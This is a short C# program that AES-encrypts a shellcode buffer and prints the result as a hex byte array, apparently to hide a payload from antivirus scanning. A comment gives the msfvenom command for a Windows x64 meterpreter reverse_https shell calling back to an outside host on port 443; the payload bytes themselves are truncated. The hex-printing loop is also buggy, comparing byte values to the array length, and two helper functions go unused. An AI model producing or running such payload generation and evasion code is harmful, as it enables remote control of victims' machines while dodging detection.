using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;

namespace AES
{
    class Program
    {
        static void Main(string[] args)
        {
            // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
            byte[] buf = new byte[725] { 0xfc, 0x48, 0x83 ... };

            byte[] Key = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw=="); //A valid 128-bit key is new byte[]{ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F }
            byte[] IV = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");

            byte[] aesshell = EncryptShell(buf, Key, IV);

            StringBuilder hex = new StringBuilder(aesshell.Length * 2);
            int totalCount = aesshell.Length;
            foreach (byte b in aesshell)
            {
                if ((b + 1) == totalCount)
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }
            }
            Console.WriteLine(hex);
        }

        private static byte[] GetIV(int num)
        {
            var randomBytes = new byte[num];

            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(randomBytes);
            }

            return randomBytes;
        }

        private static byte[] GetKey(int size)
        {
            char[] caRandomChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()".ToCharArray();
            byte[] CKey = new byte[size];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetBytes(CKey);
            }
            return CKey;
        }

        private static byte[] EncryptShell(byte[] CShellcode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return AESEncryptedShellCode(CShellcode, encryptor);
                }
            }
        }

        private static byte[] AESEncryptedShellCode(byte[] CShellcode, ICryptoTransform cryptoTransform)
        {
            using (var msEncShellCode = new MemoryStream())
            using (var cryptoStream = new CryptoStream(msEncShellCode, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(CShellcode, 0, CShellcode.Length);
                cryptoStream.FlushFinalBlock();

                return msEncShellCode.ToArray();
            }
        }
    }
}